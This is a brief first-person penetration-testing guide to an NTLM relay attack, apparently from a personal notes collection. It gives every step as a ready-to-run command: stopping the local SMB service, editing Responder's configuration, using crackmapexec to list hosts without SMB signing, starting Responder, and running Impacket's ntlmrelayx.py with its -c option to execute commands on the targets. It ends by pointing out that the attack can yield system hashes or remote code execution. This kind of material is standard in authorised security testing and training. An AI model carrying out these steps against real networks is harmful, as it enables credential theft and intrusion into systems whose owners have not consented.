# <h1 align="center" id="heading">NTLM Relay</h1>
This attack scenario is viable when you can force authentication to an attacker controlled SMB share hosted by Responder. If I can obtain a Net-NTLMv1/v2 hash from a target and SMB Signing is disabled (default) there is a potential that I can relay the hash using Impacket's ntlmrelayx.py. There are a few ways that I can go about this but there are some requirements to set up this attack. The first of which I need to disable my Kali SMB server with the following command:
```console
sudo systemctl stop smbd nmbd
```
Once I have stopped the SMB server, I also need to change the configuration file for Responder to turn off SMB and HTTP servers. I can accomplish this with the following command:
```console
vim ~/tools/Responder/Responder.conf
```
The configuration file should look something like this:
```console
[Responder Core]

; Servers to start
SQL = On
SMB = Off # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off # Turn this off
HTTPS = On
DNS = On
LDAP = On
```
I will also need to generate a list of targets where SMB signing is disabled, I can do this for an entire CIDR with the following command:
```console
crackmapexec smb <target network>/24 --gen-relay-list relay.txt
```
Once I have a list of targets that does now have SMB signing enabled, I can use the following command to start up Responder:
```console
sudo python ~/tools/Responder/Responder.py -I tun0 -wrd 
```
I will also start up Impacket's ntlmrelayx.py with the following command:
```console
sudo python3 ~/tools/impacket/examples/ntlmrelayx.py --no-http-server -smb2support -tf relay.txt
```
I can also use the -c option to execute commands on the target system as follows:
```console
sudo python3 ~/tools/impacket/examples/ntlmrelayx.py --no-http-server -smb2support -tf relay.txt -c "whoami"
```
This could lead to me grabbing valid system hashes or obtaining remote code execution on the target!
